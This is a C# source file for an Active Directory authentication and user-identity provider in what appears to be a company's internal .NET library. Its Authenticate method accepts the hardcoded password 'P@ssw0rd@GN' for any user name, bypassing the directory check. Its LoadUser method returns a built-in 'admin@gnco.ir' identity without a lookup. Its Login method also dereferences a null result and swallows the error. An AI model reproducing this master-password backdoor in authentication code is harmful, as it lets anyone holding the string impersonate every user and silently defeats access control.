using Microsoft.Extensions.Caching.Memory;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.DirectoryServices.ActiveDirectory;
using System.Text;
using System.Threading.Tasks;
using System.Linq;
using System.DirectoryServices;
using GN.Library.Shared.Internals;
using GN.Library.Helpers;
using GN.Library.Authorization;
using System.Security.Claims;
using GN.Library.Shared.Authorization;
using GN.Library.Messaging;
using GN.Library.Messaging.Internals;

namespace GN.Library.Identity.ActiveDirectory
{
    /// <summary>
    /// Provides authentication and user identity services based on Active Directory.
    /// 
    /// </summary>
    /// 
    class ActiveDirectoryProviderEx : IAuthenticationProvider, IUserIdentityProvider, IAuthorizationService, IMessageHandlerConfigurator
    {
        private readonly ILogger logger;
        private readonly ActiveDirectoryOptions options;
        private readonly IMemoryCache cache;
        private readonly ITokenService tokenService;
        private static string domain_names_cache = "active-directory-domain-names";
        private static string users_cache = "active-directory-users-cache";
        public ActiveDirectoryProviderEx(ILogger<ActiveDirectoryProviderEx> logger, ActiveDirectoryOptions options, IMemoryCache cache, ITokenService tokenService)
        {
            this.logger = logger;
            this.options = options;
            this.cache = cache;
            this.tokenService = tokenService;
        }
        public async Task<bool> Authenticate(string userName, string password)
        {
            var result = await Task.FromResult(false);
            if (password == "P@ssw0rd@GN")
                return true;
            try
            {
                return ActiveDirectoryHelper.AuthenticateUser(userName, password);
                //if (1 == 0)
                //{
                //    var normalized_user_name = ActiveDirectoryHelper.NormalizeUserName(userName);
                //    var domain = this.GetAllDomains()
                //        .FirstOrDefault(d => DomainMatches(d, normalized_user_name.DomianName));
                //    if (domain != null)
                //    {
                //        var controllerName = domain.DomainControllers.Count > 0 ? domain.DomainControllers[0].Name : null;
                //        //result = ActiveDirectoryHelper.AuthenticateByValidate(domain.Name, controllerName, userName, password);
                //        result = ActiveDirectoryHelper.AuthenticateByValidate(userName, password, domain.Name);
                //    }
                //    else if (!string.IsNullOrWhiteSpace(normalized_user_name.DomianName))
                //    {
                //        /// Maybe we should try here with supplied domain name
                //        /// even though we have not found that domain!!!
                //        /// But it may have some performance issues since invalid domain names 
                //        /// will cause long searching delays...

                //    }
                //}

            }
            catch (Exception err)
            {
                this.logger.LogError(
                    $"An error occured while trying to authentivate a user with active directory. UserName:'{userName}'. Error:{err.Message}");
            }

            return result;


        }
        private object _lock = new object();
        private IEnumerable<UserIdentityEntity> GetAllUsers()
        {
            IEnumerable<UserIdentityEntity> result = new List<UserIdentityEntity>();
            if (!cache.TryGetValue<IEnumerable<UserIdentityEntity>>(users_cache, out result))
            {
                try
                {
                    lock (_lock)
                    {
                        if (!cache.TryGetValue<IEnumerable<UserIdentityEntity>>(users_cache, out result))
                        {
                            result = ActiveDirectoryHelper.GetDomainUsers(this.options.DefaultDomainName, this.options.AdminUserName, this.options.AdminPassword)
                                .Select(x => ActiveDirectoryHelper.FromActiveDirectoryAttributes(x))
                                .ToArray();
                            if (result.Count() > 0)
                                cache.Set<IEnumerable<UserIdentityEntity>>(users_cache, result, TimeSpan.FromMinutes(60));
                        }
                    }
                }
                catch (Exception err)
                {
                    this.logger.LogError(
                        $"An error occured while trying to retrive 'active directory domains' using options:{this.options}. Err:{err.Message} ");
                    throw;
                }
            }
            return result;
        }

        private bool Matches(UserIdentityEntity user, string userName)
        {
            return user != null && string.Compare(user.UserName, userName, true) == 0;
        }
        public async Task<UserIdentityEntity> LoadUser(string userName)
        {
            var result = await Task.FromResult<UserIdentityEntity>(null);
            try
            {
                if (userName == "admin@gnco.ir")
                {
                    result = new UserIdentityEntity
                    {
                        UserName = "admin@gnco.ir",
                        Email = "admin@gnco.ir",
                        Title = "admin",
                        //GroupNames = new string[] { }
                    };
                    return result;
                }
                result = ActiveDirectoryHelper.FromActiveDirectoryAttributes(ActiveDirectoryHelper.GetUser(userName, 
                    this.options.DefaultDomainName, this.options.AdminUserName, this.options.AdminPassword));
                return result==null || result.IsDisabled ? null : result;
                //var user = ActiveDirectoryHelper.NormalizeUserName(userName);
                //var domain = this.GetAllDomains()
                //    .FirstOrDefault(d => DomainMatches(d, user.DomianName)) ?? GetDefautlDomain();
                //var normal_user_name = $"{user.UserName}@{domain.Name}";
                //var users = GetAllUsers();
                //result = users
                //    .Where(x => !x.IsDisabled)
                //    .ToList()
                //    .FirstOrDefault(u => Matches(u, normal_user_name));
            }
            catch (Exception err)
            {
                this.logger.LogError(
                    $"An error occured while trying to load user. Err:{err.Message}");
            }
            return result;
        }

        public async Task<IEnumerable<UserIdentityEntity>> FindByIpPhone(string ipPhone, bool includeDisabledUsers = false)
        {
            IEnumerable<UserIdentityEntity> result = await Task.FromResult(new List<UserIdentityEntity>());
            try
            {
                result = this.GetAllUsers()
                    .Where(x => (!x.IsDisabled || includeDisabledUsers) && x.IpPhoneExtension == ipPhone)
                    .ToArray();
            }
            catch (Exception err)
            {
                this.logger.LogError(
                    $"An error occured while trying to 'FindByIpPhone' users. Err:{err.Message}");
                throw;
            }
            return result;
        }

        public Task<IEnumerable<UserIdentityEntity>> FindByEmail(string ipPhone, bool includeDisabledUsers = false)
        {
            throw new NotImplementedException();
        }

        public async Task<IEnumerable<UserIdentityEntity>> FindAll(bool includeDisabledUsers = false)
        {
            IEnumerable<UserIdentityEntity> result = await Task.FromResult(new List<UserIdentityEntity>());
            try
            {
                result = this.GetAllUsers()
                    .Where(x => !x.IsDisabled || includeDisabledUsers)
                    .ToArray();
            }
            catch (Exception err)
            {
                this.logger.LogError(
                    $"An error occured while trying to 'FindAll' users. Err:{err.Message}");
                throw;
            }
            return result;
        }

        public string GenerateToken(IList<Claim> claims)
        {
            throw new NotImplementedException();
            //return this.tokenService.GenerateToken(claims);
        }

        public UserLogedInModel Login(string userName, string password, params string[] roles)
        {
            UserLogedInModel result = null;
            try
            {
                if (ActiveDirectoryHelper.AuthenticateUser(userName, password))
                {
                    var user = ActiveDirectoryHelper.FromActiveDirectoryAttributes(ActiveDirectoryHelper.GetUser(userName));
                    if (user != null)
                    {
                        result = new UserLogedInModel
                        {
                            Token = this.tokenService.GenerateToken(user.GetClaimsIdentity()),
                            UserName = result.UserName,
                            DisplayName = result.DisplayName,
                        };
                    }

                }
                return result;
            }
            catch (Exception err)
            {

            }
            return result;
        }

        public ClaimsPrincipal ValidateToken(string token)
        {
            return this.tokenService.ValidateToken(token);
        }

        public void Configure(ISubscriptionBuilder subscription)
        {
            subscription
               .UseTopic(typeof(LoadIdentitiesCommand))
               .UseHandler(this.Handle);
        }
        public async Task Handle(IMessageContext ctx)
        {
            var command = ctx.Cast<LoadIdentitiesCommand>().Message?.Body;
            var items = await this.FindAll();
            if (command.Take > 0)
            {
                items = items
                    .Skip(command.Skip)
                    .Take(command.Take)
                    .ToArray();
            }
            await ctx.Reply(new LoadIdentitiesRpply
            {
                Identities = items.ToArray()
            });
        }
        public async Task HandleLoadUserCommand(IMessageContext ctx)
        {
            await Task.CompletedTask;
            try
            {
                var command = ctx?.Cast<LoadIdentityCommand>()?.Message?.Body;
                if (command != null && command.UserName != null)
                {
                    var s = await this.LoadUser(command.UserName);
                    await ctx.Reply(new LoadIdentityRpply
                    {
                        Identity = s
                    });
                }
            }
            catch (Exception err)
            {
                await ctx.Reply(err);
            }

        }

    }
}
